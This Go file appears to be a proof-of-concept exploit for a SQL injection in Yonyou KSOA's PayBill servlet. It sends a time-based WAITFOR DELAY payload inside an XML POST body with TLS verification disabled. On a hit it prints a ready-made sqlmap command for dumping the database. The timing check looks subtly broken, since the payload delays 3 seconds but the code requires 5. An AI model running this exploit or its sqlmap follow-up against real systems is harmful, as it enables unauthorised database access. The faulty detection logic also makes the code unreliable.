package poc

import (
	"bytes"
	"crypto/tls"
	"log"
	"net/http"
	"strings"
	"time"
)

func KSOAPayBill(target string) {
	url := strings.TrimRight(target, "/")
	startTime := time.Now()
	data := `<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1' WAITFOR DELAY '00:00:03';--</name><name>1</name><name>102360</name></root>`
	req, err := http.NewRequest("POST", url+"/servlet/PayBill?caculate&_rnd=", bytes.NewBufferString(data))
	if err != nil {
		log.Println(err)
		return
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		elapsed := time.Since(startTime)
		elapsedSeconds := elapsed.Seconds()
		if elapsedSeconds >= 5 {
			log.Println("[+] 存在用友 KSOA PayBill SQL注入")
			log.Println("[+] sqlmap命令：sqlmap.py -u \"" + url + `\" --data \"<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1'*</name><name>1</name><name>102360</name></root>\" --random-agent --hex`)
		} else {
			log.Println("[-] 不存在用友 KSOA PayBill SQL注入")
		}
	}
}
